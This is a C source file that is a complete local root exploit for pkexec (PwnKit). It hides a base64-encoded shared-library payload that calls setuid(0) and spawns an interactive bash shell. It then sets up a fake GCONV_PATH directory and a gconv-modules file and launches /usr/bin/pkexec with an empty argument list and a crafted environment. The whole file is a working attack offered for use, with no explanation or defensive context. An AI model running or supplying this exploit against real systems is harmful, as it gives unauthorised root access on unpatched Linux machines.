#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *EVIL_GCONV_PATH = "evil_gconv";

void enviroment() {
    char initialization_cmd[1000], lib_preparations[1000], gconv_modules[1000];

    sprintf(initialization_cmd, "DIR='GCONV_PATH=.' && FILE=\"$DIR/%s\" && mkdir -p $DIR && ([[ -f $FILE ]] || touch $FILE) && chmod +x $FILE", EVIL_GCONV_PATH);
    system(initialization_cmd);

    sprintf(lib_preparations, "EVIL_GCONV_PATH=%s && mkdir -p $EVIL_GCONV_PATH; echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBzZXRfcGVybWlzc2lvbnMoKSB7CiAgICBzZXR1aWQoMCk7CiAgICBzZXRldWlkKDApOwogICAgc2V0Z2lkKDApOwp9Cgp2b2lkIGdjb252KHZvaWQpIHt9Cgp2b2lkIGdjb252X2luaXQodm9pZCAqc3RlcCkgewogICAgc2V0X3Blcm1pc3Npb25zKCk7CgogICAgLyogSW52b2tlIFNoZWxsICovCiAgICBjaGFyICpzaGVsbFtdID0geyIvYmluL2Jhc2giLCAiLWkiLCBOVUxMfTsKCiAgICAvKiBEZWZpbmluZyBwYXRoICovCiAgICBjaGFyICplbnZfdmFyc1tdID0geyJQQVRIPS91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbiIsIE5VTEx9OwoKICAgIGV4ZWN2ZShzaGVsbFswXSwgc2hlbGwsIGVudl92YXJzKTsKICAgIGV4aXQoMCk7Cn0K | base64 -d > $EVIL_GCONV_PATH/b64load.c; gcc $EVIL_GCONV_PATH/b64load.c -o $EVIL_GCONV_PATH/pwnkit.so -shared -fPIC", EVIL_GCONV_PATH);
    system(lib_preparations);

    sprintf(gconv_modules, "EVIL_GCONV_PATH=%s && echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d > $EVIL_GCONV_PATH/gconv-modules", EVIL_GCONV_PATH);
    system(gconv_modules);
}

void print_banner() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Current user: ");
    system("whoami");
    sleep(1);
}

int main(int argc, char **argv) {
    print_banner();

    enviroment();

    char *const idk[] = {
        NULL};
    char *const entorno[] = {EVIL_GCONV_PATH,
                             "PATH=GCONV_PATH=.",
                             "SHELL=/random",
                             "CHARSET=PWNKIT",
                             "GIO_USE_VFS=", NULL};
    return execve("/usr/bin/pkexec", idk, entorno);
}
